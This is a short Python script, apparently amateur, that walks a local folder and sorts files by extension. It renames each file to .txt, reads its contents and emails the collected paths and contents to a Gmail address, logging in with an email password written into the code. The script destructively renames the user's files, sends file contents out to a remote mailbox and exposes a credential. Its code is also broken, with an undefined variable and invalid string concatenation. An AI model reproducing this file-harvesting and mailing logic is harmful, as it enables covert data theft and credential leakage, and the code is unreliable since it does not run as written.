__author__ = 'Administrator'

import os, smtplib
#coding: gbk

fl = []
fs = []
fc = []
Final=""


def CheckStruct(FileExt):
    DiskImg = [".iso", ".bin", ".nrg", ".vcd", ".cif", ".fcd", ".img", ".ccd", ".c2d", ".dfi", ".tao", ".dao", ".cue",
               ".isz", ".b5t", ".mds", ".ccd", ".bwt", ".cdi", ".nrg", ".pdi", ".wim", ".swm"]
    DataComp = [".rar", ".zip", ".7z", ".arj", ".cab", ".lzh", ".ace", ".tar", ".gz", ".uue", ".bz2", ".jar", ".iso"]
    Image = [".bmp", ".iff", ".ilbm", ".tiff", ".tif", ".png", ".gif", ".jpeg", ".jpg", ".mng", ".xpm", ".psd", ".psp",
             ".ufo", ".xcf", ".pcx", ".ppm", ".ps", ".eps", ".ai", ".fh", ".swf", ".fla", ".svg", ".wmf", ".dxf",
             ".cgm"]
    Audio = [".wav", ".pcm", ".als", ".alac", ".tak", ".flac", ".ape", ".wv", ".mp3", ".aac", ".wma", ".ogg", ".ram",
             ".mmf", ".amr", ".au"]
    Document = [".doc", ".ppt", ".xls", ".txt", ".pdf", ".wps", ".rtf", ".hip", ".html", ".htm"]
    Video = [".avi", ".rmvb", ".mkv", ".rm", ".mp4", ".asf", ".mpg", ".asf", ".divx", ".mpeg", ".mpe", ".wmv", ".vob"]
    WinSys = [".int", ".sys", ".dll", ".adt"]
    Exe = [".exe", ".com"]
    Prog = [".c", ".cpp", ".jar", ".java", ".py", ".h"]

    All=DiskImg+DataComp+Image+Audio+Document+Video+WinSys+Exe+Prog
    if FileExt not in All:
        return "Not Supported File Type"


    if FileExt == "":
        return "No extension File"

    for a in DiskImg:
        if a == FileExt:
            return "DiskImage File"
    for b in DataComp:
        if b == FileExt:
            return "DataCompression File"
    for c in Image:
        if c == FileExt:
            return "Image File"
    for d in Audio:
        if d == FileExt:
            return "Audio File"
    for e in Video:
        if e == FileExt:
            return "Video File"
    for f in WinSys:
        if f == FileExt:
            return "Windows System File"
    for g in Exe:
        if g == FileExt:
            return "Executable File"
    for h in Prog:
        if h == FileExt:
            return "Programing Source File"



folder='H:/H/h'
for dirname, dirnames, filenames in os.walk(folder):
    # print path to all subdirectories first.
    for subdirname in dirnames:
        print(os.path.join(dirname, subdirname))

    # print path to all filenames.
    for filename in filenames:
        infilename = os.path.join(dirname, filename)
        if not os.path.isfile(infilename): continue
        base,ext= os.path.splitext(filename)
        fl.append(infilename)
        fs.append(CheckStruct(ext))
        newname=infilename.replace(ext,".txt")
        output=os.rename(infilename,newname)
        fh = open(newname, 'r+')
        content=fh.readlines()
        fc.append(content)
        newname1=infilename.replace(txt,".py")
        output1=os.rename(infilename,newname1)





for r in range(0, len(fl)):
    FinalEle = fl[r] + '\t' + fs[r] + '\n'+fc[r]+'\n'
    Final = FinalEle + Final

TO = 'kelvinchao96@gmail.com'
SUBJECT = 'Send From Python'
TEXT = Final
gmail_sender = 'kelvinchao96@gmail.com'
gmail_pwd = 'KK509624.'

server = smtplib.SMTP('smtp.gmail.com', 587)
server.ehlo()
server.starttls()
server.ehlo()
server.login(gmail_sender, gmail_pwd)
BODY = '\r\n'.join([
    'To:%s' % TO,
    'From:%s' % gmail_sender,
    'Subject:%s' % SUBJECT,
    '',
    TEXT
])

server.sendmail(gmail_sender, [TO], BODY)
server.quit()
